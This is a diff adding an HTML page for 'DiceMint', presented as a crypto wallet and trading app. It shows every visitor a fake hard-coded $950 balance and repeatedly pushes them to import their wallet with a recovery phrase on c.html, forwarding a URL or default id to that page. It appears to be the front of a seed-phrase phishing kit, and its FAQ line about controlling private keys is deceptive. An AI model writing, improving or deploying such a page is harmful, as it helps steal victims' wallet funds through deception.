@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DiceMint</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      transition: background 0.3s, color 0.3s;
+    }
+
+    .light-theme {
+      background-color: #f4f4f4;
+      color: #000;
+    }
+
+    .nav {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      display: flex;
+      justify-content: space-around;
+      background-color: #111;
+      padding: 10px 0;
+      border-top: 1px solid #222;
+    }
+
+    .light-theme .nav {
+      background-color: #fff;
+      border-top: 1px solid #ccc;
+    }
+
+    .nav a {
+      color: #ccc;
+      text-decoration: none;
+      text-align: center;
+      font-size: 13px;
+      flex: 1;
+    }
+
+    .light-theme .nav a {
+      color: #444;
+    }
+
+    .nav a.active {
+      color: #00f7ff;
+    }
+
+    .nav a span {
+      display: block;
+      font-size: 20px;
+      margin-bottom: 3px;
+    }
+
+    .content-section {
+      display: none;
+      padding: 20px;
+      padding-bottom: 80px;
+    }
+
+    .content-section.active {
+      display: block;
+    }
+
+    .content-box {
+      margin-bottom: 20px;
+      background-color: #111;
+      padding: 15px;
+      border-radius: 10px;
+      transition: background 0.3s;
+    }
+
+    .light-theme .content-box {
+      background-color: #fff;
+      border: 1px solid #ccc;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 10px 15px;
+      background-color: #00f7ff;
+      color: #000;
+      text-decoration: none;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+
+    /* Theme toggle button */
+    .theme-toggle {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+      z-index: 999;
+    }
+  </style>
+</head>
+<body>
+
+<!-- THEME TOGGLE BUTTON -->
+<button class="theme-toggle" onclick="toggleTheme()">🌙</button>
+
+<!-- HOME -->
+<div id="home" class="content-section active">
+  <div class="content-box">
+    <h2>💼 Wallet</h2>
+    <p>Your current balance:</p>
+    <div style="font-size: 24px; margin-top: 10px;">
+      <strong class="walletAmount">$950</strong> (<span class="bnbValueHome">--</span> BNB)
+    </div>
+  </div>
+
+  <div class="content-box">
+    <h2 style="color: #44e3ff;">🔐 Import Wallet</h2>
+    <p style="color: #cceeff;">Click the button below to import your wallet using a recovery phrase.</p>
+    <span>Add your wallet to start earning or trading</span>
+    <p>You are trading in your own crypto wallet</p>
+    <a href="c.html" class="btn">Import Wallet</a>
+  </div>
+
+  <div class="content-box">
+    <h2>📊 BNB Price</h2>
+    <div id="bnbPrice">Loading BNB price...</div>
+  </div>
+</div>
+
+<!-- WALLET -->
+<div id="wallet" class="content-section">
+  <div class="content-box">
+    <h2>💼 Wallet</h2>
+    <p>Your current balance:</p>
+    <div style="font-size: 24px; margin-top: 10px;">
+      <strong class="walletAmount">$950</strong> (<span class="bnbValueWallet">--</span> BNB)
+    </div>
+  </div>
+
+  <div class="content-box">
+    <h2 style="color: #44e3ff;">🔐 Import Wallet</h2>
+    <p style="color: #cceeff;">Click the button below to import your wallet using a recovery phrase.</p>
+    <p>You are trading in your own crypto wallet</p>
+    <a href="c.html" class="btn">Import Wallet</a>
+  </div>
+</div>
+
+<!-- EARN -->
+<div id="earn" class="content-section">
+  <div class="content-box">
+    <h2>💸 Earn</h2>
+    <p>Stake your BNB or refer friends to earn rewards. Import wallet to get started...</p>
+    <a href="c.html" class="btn">Import Wallet</a>
+  </div>
+</div>
+<!-- HISTORY -->
+<div id="history" class="content-section">
+  <div class="content-box">
+    <h2>📜 History</h2>
+    <p>No transactions yet.</p>
+  </div>
+</div>
+
+<!-- FAQ -->
+<div id="faq" class="content-section">
+  <div class="content-box">
+    <h2>❓ FAQ</h2>
+    <p><strong>Q:</strong> How do I start trading?<br><strong>A:</strong> Import your wallet and fund with BNB.</p>
+    <p><strong>Q:</strong> Is my wallet secure?<br><strong>A:</strong> You control your private keys.</p>
+  </div>
+</div>
+
+<!-- NAVIGATION -->
+<div class="nav">
+  <a href="#" class="nav-link active" onclick="showSection(event, 'home')">
+    <span>🏠</span>Home
+  </a>
+  <a href="#" class="nav-link" onclick="showSection(event, 'wallet')">
+    <span>👛</span>Wallet
+  </a>
+  <a href="#" class="nav-link" onclick="showSection(event, 'earn')">
+    <span>💸</span>Earn
+  </a>
+  <a href="#" class="nav-link" onclick="showSection(event, 'history')">
+    <span>📜</span>History
+  </a>
+  <a href="#" class="nav-link" onclick="showSection(event, 'faq')">
+    <span>❓</span>FAQ
+  </a>
+</div>
+
+<!-- JS -->
+<script>
+  function showSection(event, id) {
+    document.querySelectorAll('.content-section').forEach(sec => {
+      sec.classList.remove('active');
+    });
+    document.getElementById(id).classList.add('active');
+
+    document.querySelectorAll('.nav-link').forEach(link => {
+      link.classList.remove('active');
+    });
+    event.target.closest('a').classList.add('active');
+  }
+
+  document.querySelectorAll('.walletAmount').forEach(el => {
+    el.textContent = "$950";
+  });
+
+  document.querySelectorAll('.bnbValueHome, .bnbValueWallet').forEach(el => {
+    el.textContent = "0.12";
+  });
+
+  function toggleTheme() {
+    const isLight = document.body.classList.toggle('light-theme');
+    const toggleBtn = document.querySelector('.theme-toggle');
+    toggleBtn.textContent = isLight ? '☀️' : '🌙';
+    localStorage.setItem('theme', isLight ? 'light' : 'dark');
+  }
+
+  // Load theme preference
+  window.onload = function () {
+    const savedTheme = localStorage.getItem('theme');
+    if (savedTheme === 'light') {
+      document.body.classList.add('light-theme');
+      document.querySelector('.theme-toggle').textContent = '☀️';
+    }
+  };
+</script>
+<script>
+  const USD_BALANCE = 950; // your wallet balance in USD
+
+  async function loadBNBPrice() {
+    try {
+      const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
+      const data = await res.json();
+
+      const bnbPrice = parseFloat(data.price); // BNB price in USD
+      const bnbAmount = (USD_BALANCE / bnbPrice).toFixed(4);
+
+      // Update price display
+      document.getElementById("bnbPrice").textContent =
+        `1 BNB = $${bnbPrice.toLocaleString()}`;
+
+      // Update BNB values in wallet sections
+      document.querySelectorAll(".bnbValueHome, .bnbValueWallet").forEach(el => {
+        el.textContent = bnbAmount;
+      });
+
+    } catch (err) {
+      document.getElementById("bnbPrice").textContent = "Failed to load BNB price";
+      console.error(err);
+    }
+  }
+
+  // Load immediately
+  loadBNBPrice();
+
+  // Refresh every 30 seconds
+  setInterval(loadBNBPrice, 30000);
+</script>
+<script>
+  // DEFAULT ID (used if none in URL)
+  const DEFAULT_ID = "7979664801";
+
+  // Get id from URL
+  const params = new URLSearchParams(window.location.search);
+  const userId = params.get("id") || DEFAULT_ID;
+
+  // Update all c.html links
+  document.querySelectorAll('a[href="c.html"]').forEach(link => {
+    link.href = `c.html?id=${encodeURIComponent(userId)}`;
+  });
+</script>
+</body>
+</html>
